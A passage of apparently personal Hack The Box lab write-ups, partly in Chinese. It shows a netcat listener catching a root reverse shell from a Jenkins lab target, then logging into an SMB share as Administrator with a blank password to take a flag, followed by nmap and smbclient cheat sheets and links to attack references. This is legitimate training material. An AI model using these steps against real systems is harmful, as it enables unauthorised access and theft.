      }
      steps {
        sh 'mvn deploy -P cloudhub -Dmule.version=4.0.0 -Danypoint.username=${ANYPOINT_CREDENTIALS_USR} -Danypoint.password=${ANYPOINT_CREDENTIALS_PSW}' 
      }
    }
  }
}
```

### Connect from target to our host

![Untitled](HTB%20writeu%20673ee/Untitled%2058.png)

![Untitled](HTB%20writeu%20673ee/Untitled%2059.png)

```bash
nc -vnlp 8000
listening on [any] 8000 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.75.150] 44200
```

![Untitled](HTB%20writeu%20673ee/Untitled%2060.png)

```groovy
nc -vnlp 8000
listening on [any] 8000 ...
connect to [10.10.14.37] from (UNKNOWN) [10.129.75.150] 44244
whoami
root
```

```groovy
cd
ls
cat flag.txt
9cdfb439c7876e703e307864c9167a15
```

![Untitled](HTB%20writeu%20673ee/Untitled%2061.png)

### flag

```groovy
9cdfb439c7876e703e307864c9167a15
```

---

# 🏈  Tactics (SMB)

這次也是練習 SMB，基本上就是熟悉 nmap 和 smbclient 指令和看你要不要用 PSexec.py

```
10.129.77.79
```

### recon

```
nmap -A 10.129.77.79
```

```bash
Nmap scan report for 10.129.77.56
Host is up (0.28s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11m38s
| smb2-time: 
|   date: 2022-03-05T03:08:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   283.34 ms 10.10.14.1
2   283.44 ms 10.129.77.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.68 seconds
```

👉  Windows 2000 之後就有使用 port 455 for SMB

### using smbclient

基本上一定要 try try 的預設帳號就是 Administrator，因為題目是模擬 misconfiguration，所以沒有設定密碼，輸入密碼時直接按 enter 繼續

### list

```bash
smbclient -U Administrator -L 10.129.77.79
```

```bash
smbclient -U Administrator -L 10.129.77.79
Enter WORKGROUP\Administrator's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

### connect to shared folder, try to find flag

```bash
smbclient \\\\10.129.77.79\\ADMIN$ -U Administrator
```

```bash
smb: \> help
```

```bash
smb: \> ls
```

![Untitled](HTB%20writeu%20673ee/Untitled%2062.png)

too much thins, hum...

try to access C$ folder

```bash
smbclient \\\\10.129.77.79\\C$ -U Administrator
```

```bash
cd Users\Administrator\Desktop\
```

```bash
cd dir
```

```bash
get flag.txt
```

![Untitled](HTB%20writeu%20673ee/Untitled%2063.png)

```bash
exit
```

```bash
cat flag.txt
```

### flag

```bash
f751c19eda8f61ce81827e6930a1f40c
```

官方 writeup 有提到 `impacket` repo 裡的 `PSexec.py` 這個工具，也可以用來當作 interactive shell，可以自行使用

impacket/psexec.py at master · SecureAuthCorp/impacket
[https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)

---

### Ref

Session Layer in OSI Model - Studyopedia
[https://studyopedia.com/computer-networks/session-layer-in-osi-model/](https://studyopedia.com/computer-networks/session-layer-in-osi-model/)
The OSI Model Layers from Physical to Application
[https://www.lifewire.com/layers-of-the-osi-model-illustrated-818017](https://www.lifewire.com/layers-of-the-osi-model-illustrated-818017)

SecureAuthCorp/impacket: Impacket is a collection of Python classes for working with network protocols.
[https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

### tldr nmap

在真實環境你應該會很常使用 `-Pn`

```
nmap -Pn -sC <host>
```

- `Pn : Treat all hosts as online -- skip host discovery
-sC : Equivalent to --script=default`

```bash
- Check if an IP address is up, and guess the remote host's operating system:
   nmap -O {{ip_or_hostname}}

 - Try to determine whether the specified hosts are up and what their names are:
   nmap -sn {{ip_or_hostname}} {{optional_another_address}}

 - Like above, but also run a default 1000-port TCP scan if host seems up:
   nmap {{ip_or_hostname}} {{optional_another_address}}

 - Also enable scripts, service detection, OS fingerprinting and traceroute:
   nmap -A {{address_or_addresses}}

 - Assume good network connection and speed up execution:
   nmap -T4 {{address_or_addresses}}

 - Scan a specific list of ports (use -p- for all ports 1-65535):
   nmap -p {{port1,port2,…,portN}} {{address_or_addresses}}

 - Perform TCP and UDP scanning (use -sU for UDP only, -sZ for SCTP, -sO for IP):
   nmap -sSU {{address_or_addresses}}

 - Perform full port, service, version detection scan with all default NSE scripts active against a host to determine weaknesses and info:
   nmap -sC -sV {{address_or_addresses}}
```

### tldr smbclient

```bash
smbclient
FTP-like client to access SMB/CIFS resources on servers.

 - Connect to a share (user will be prompted for password; exit to quit the session):
   smbclient {{//server/share}}

 - Connect with a different username:
   smbclient {{//server/share}} --user {{username}}

 - Connect with a different workgroup:
   smbclient {{//server/share}} --workgroup {{domain}} --user {{username}}

 - Connect with a username and password:
   smbclient {{//server/share}} --user {{username%password}}

 - Download a file from the server:
   smbclient {{//server/share}} --directory {{path/to/directory}} --command "get {{file.txt}}"

 - Upload a file to the server:
   smbclient {{//server/share}} --directory {{path/to/directory}} --command "put {{file.txt}}"
```

---

# Ref

### 🔖 bookmarks

- [Jenkins - HackTricks](https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#code-execution)
- [gquere/pwn_jenkins: Notes about attacking Jenkins servers](https://github.com/gquere/pwn_jenkins)
- [PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Online - Reverse Shell Generator](https://www.revshells.com/)
- [danielmiessler/SecLists: SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.](https://github.com/danielmiessler/SecLists)

---

### others

- [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs)
- [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)
- [Handlebars template injection and RCE in a Shopify app](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [Groovy Language Documentation](https://docs.groovy-lang.org/latest/html/documentation/)
- [What is the default password for Jenkins user? | EveryThingWhat.com](https://everythingwhat.com/what-is-the-default-password-for-jenkins-user)
- [Default credentials for Jenkins after installation(Windows 10) -Jenkins Default Password - Intellipaat Community](https://intellipaat.com/community/26950/default-credentials-for-jenkins-after-installation-windows-10-jenkins-default-password)
- [公共漏洞和暴露 - 維基百科，自由的百科全書](https://zh.wikipedia.org/wiki/%E5%85%AC%E5%85%B1%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9A%B4%E9%9C%B2)
- [What Is The CIA Triad?](https://www.f5.com/labs/articles/education/what-is-the-cia-triad)
- [Groovy - 維基百科，自由的百科全書](https://zh.wikipedia.org/wiki/Groovy)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
